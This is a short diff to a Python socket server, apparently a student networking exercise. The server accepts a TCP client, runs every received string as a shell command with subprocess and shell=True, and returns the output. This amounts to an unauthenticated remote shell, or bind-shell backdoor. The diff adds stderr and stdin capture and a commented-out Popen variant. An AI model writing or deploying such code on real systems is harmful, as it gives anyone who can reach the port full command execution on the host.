@@ -11,9 +11,13 @@ print ('The server is ready to receive')
 
 
 connectionSocket, addr = serverSocket.accept()
-print('Accepted a new client', addr)
+print('Accepted a new client', addr)   
 
 while True:
     comando = connectionSocket.recv(16536).decode()
-    result = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
+    result = subprocess.run(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8')
     connectionSocket.send(result.stdout.encode())    
+
+# while True:
+#     comando = connectionSocket.recv(16536).decode()
+#     subprocess.Popen(comando, shell=True)
